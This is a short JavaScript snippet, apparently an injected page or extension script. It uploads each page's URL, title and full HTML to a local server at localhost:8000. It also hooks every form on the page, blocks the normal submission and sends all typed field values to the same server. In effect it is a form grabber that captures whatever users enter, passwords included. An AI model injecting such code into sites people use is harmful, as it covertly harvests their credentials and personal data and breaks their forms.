setTimeout(()=>{

  let getSiteData = () => {
    return {
      url: document.URL,
      title: document.title,
      source_code: document.documentElement.innerHTML,
    };
  };

  let sendSource = async (siteData) => {
    console.log("SITEDATA : ");
    console.log(siteData);
    fetch("http://localhost:8000/source", {
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      method: "POST",
      body: JSON.stringify(siteData),
    })
      .then((resp) => resp.json())
      .then((data) => console.log(data));
  };

  sendSource(getSiteData());

  let sendFormData = async (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);
    let formValues = {};
    formData.forEach(function (value, key) {
      formValues[key] = value;
    });

    let siteData = getSiteData();

    fetch("http://localhost:8000/form", {
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      method: "POST",
      body: JSON.stringify({
        source: siteData,
        form_data: JSON.stringify(formValues),
      }),
    })
      .then((resp) => resp.json())
      .then((data) => console.log(data));
  };

  let forms = document.getElementsByTagName("form");

  for (let form of forms) {
    console.log("FORM EVENT ADDED !");
    form.addEventListener("submit", sendFormData);
  }


},2000);